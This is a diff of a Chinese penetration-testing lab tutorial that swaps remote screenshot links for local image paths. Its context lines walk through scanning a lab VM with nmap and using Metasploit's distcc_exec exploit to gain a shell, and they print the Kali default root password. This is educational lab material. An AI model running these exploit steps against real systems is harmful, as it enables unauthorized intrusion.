@@ -28,7 +28,7 @@
 
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1480164198416.png-wm)
+![图片描述](../imgs/1480164198416.png-wm.png)
 
 
 
@@ -40,18 +40,18 @@
 首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890445878.png-wm)
+![图片描述](../imgs/1479890445878.png-wm_3.png)
 
 然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)
+![图片描述](../imgs/1479890565816.png-wm_3.png)
 
 注意由于虚拟机启动需要时间，大概要等四分钟左右我们就可以使用 SSH 访问两台虚拟机了。
 
 首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)
+![图片描述](../imgs/1479890676283.png-wm_3.png)
 
 现在两台实验环境都已经启动，我们可以开始渗透测试实验了。
 
@@ -196,7 +196,7 @@ end
 sudo service postgresql start
 
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480000480023.png-wm)
+![图片描述](../imgs/1480000480023.png-wm.png)
 
 
 接着在实验楼的 Kali 终端中，输入命令，打开 MSF 终端：
@@ -206,7 +206,7 @@ sudo service postgresql start
 sudo msfconsole
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479991291836.png-wm)
+![图片描述](../imgs/1479991291836.png-wm.png)
 
 使用扫描神器 Nmap 对渗透的目标主机，进行扫描：
 
@@ -215,7 +215,7 @@ sudo msfconsole
 nmap -sV -T4 target
 ```
 
-![实验楼](https://dn-simplecloud.shiyanlou.com/2120081480231051021-wm)
+![实验楼](../imgs/2120081480231051021-wm.png)
 
 
 | 参数  | 参数所代表含义                                               |
@@ -233,7 +233,7 @@ nmap -sV -T4 target
 search distcc
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480001481635.png-wm)
+![图片描述](../imgs/1480001481635.png-wm.png)
 
 
 在 Kali 的 MSF 终端中，使用 `use` 命令，使用相应的模块：
@@ -243,7 +243,7 @@ search distcc
 use exploit/unix/misc/distcc_exec
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483509242282.png-wm)
+![图片描述](../imgs/1483509242282.png-wm.png)
 
 
 接着再使用 `show options` 命令，显示模块参数信息：
@@ -253,14 +253,14 @@ use exploit/unix/misc/distcc_exec
 show options
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480001711639.png-wm)
+![图片描述](../imgs/1480001711639.png-wm.png)
 
 ```
 # 利用 set 命令，设置渗透目标主机参数 RHOST 为 192.168.122.102
 set RHOST 192.168.122.102
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480002814943.png-wm)
+![图片描述](../imgs/1480002814943.png-wm.png)
 
 
 
@@ -271,7 +271,7 @@ set RHOST 192.168.122.102
 exploit
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483509502233.png-wm)
+![图片描述](../imgs/1483509502233.png-wm.png)
 
 
 # 四、验证渗透攻击
@@ -291,7 +291,7 @@ hostname
 ifconfig
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480003230387.png-wm)
+![图片描述](../imgs/1480003230387.png-wm.png)
 
 
 由图可知，在输入命令后 `hostname` 以及 ip 地址为 `192.168.122.102`,由显示数据看出，所进行的渗透测试已经成功。
